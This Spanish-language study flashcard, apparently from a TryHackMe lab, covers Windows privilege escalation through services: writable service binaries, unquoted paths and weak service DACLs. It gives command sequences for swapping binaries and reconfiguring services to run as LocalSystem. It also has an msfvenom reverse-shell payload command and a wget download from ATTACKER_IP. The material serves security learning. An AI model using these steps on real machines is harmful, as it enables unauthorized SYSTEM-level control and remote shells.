### Flashcard — Windows Services Privilege Escalation

---

#### Conceptos clave

* **SCM (Service Control Manager):** gestiona inicio/parada/configuración de servicios.
* **Parámetros críticos (`sc qc <servicio>`):**

  * `BINARY_PATH_NAME`: ejecutable que lanza el servicio.
  * `SERVICE_START_NAME`: usuario que lo ejecuta.
* **DACLs:** controlan permisos sobre el servicio y su ejecutable.

---

#### Vectores de escalada

1. **Insecure Service Executable Permissions**

   * Si `icacls` muestra permisos de escritura (`M` o `F`) para *Everyone* o *Users* sobre el binario del servicio.
   * Pasos:

     ```cmd
     icacls C:\Path\service.exe
     move service.exe service.exe.bkp
     move rev-svc.exe service.exe
     icacls service.exe /grant Everyone:F
     sc stop <service>
     sc start <service>
     ```
   * Shell con los privilegios del usuario configurado en `SERVICE_START_NAME`.

---

2. **Unquoted Service Path**

   * Ocurre cuando `BINARY_PATH_NAME` no está entre comillas y contiene espacios.
   * SCM interpreta el path progresivamente:

     * `C:\MyPrograms\Disk.exe`
     * `C:\MyPrograms\Disk Sorter.exe`
     * `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
   * Si el directorio es *world-writable* (`icacls` con `AD` o `WD` para Users), colocar payload como `Disk.exe`.
   * Reiniciar servicio para ejecución.

---

3. **Insecure Service Permissions (Service DACL)**

   * Si el grupo `Users` tiene `SERVICE_ALL_ACCESS` sobre un servicio (`accesschk64.exe -qlc <servicio>`).
   * Se puede reconfigurar el servicio:

     ```cmd
     sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
     sc stop THMService
     sc start THMService
     ```
   * Resultado: ejecución como **SYSTEM**.

---

#### Payloads

* Generar reverse shell en formato **exe-service**:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATACANTE> LPORT=<PUERTO> -f exe-service -o rev-svc.exe
```

* Transferir con PowerShell:

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

---

#### Notas

* Usar `sc.exe` en PowerShell (evitar colisión con alias `sc`).
* Siempre verificar permisos:

  * `icacls` → permisos sobre ejecutable.
  * `accesschk64.exe` → permisos sobre servicio.
* Unquoted paths solo explotables si el directorio es *writable* por usuarios no privilegiados.

---

Esta flashcard cubre **los tres escenarios de escalada más comunes vía servicios**:

* Ejecutable inseguro
* Ruta sin comillas
* Permisos inseguros en el servicio

---

### Checklist Rápido — Escalada de Privilegios vía Servicios (Windows)

| Vector                           | Condición que lo habilita                              | Detección                                     | Explotación                                                              |
| -------------------------------- | ------------------------------------------------------ | --------------------------------------------- | ------------------------------------------------------------------------ |
| **Insecure Service Executable**  | Binario del servicio con permisos de escritura         | `icacls C:\Path\service.exe`                  | Reemplazar binario → `sc stop/start <svc>`                               |
| **Unquoted Service Path**        | `BINARY_PATH_NAME` sin comillas y con espacios         | `sc qc <svc>` + `icacls "C:\Dir Con Espacio"` | Drop payload `Disk.exe` en directorio writable                           |
| **Insecure Service Permissions** | DACL del servicio permite `SERVICE_ALL_ACCESS` a Users | `accesschk64.exe -qlc <svc>`                  | `sc config <svc> binPath= "rev.exe" obj= LocalSystem` + `sc start <svc>` |

---

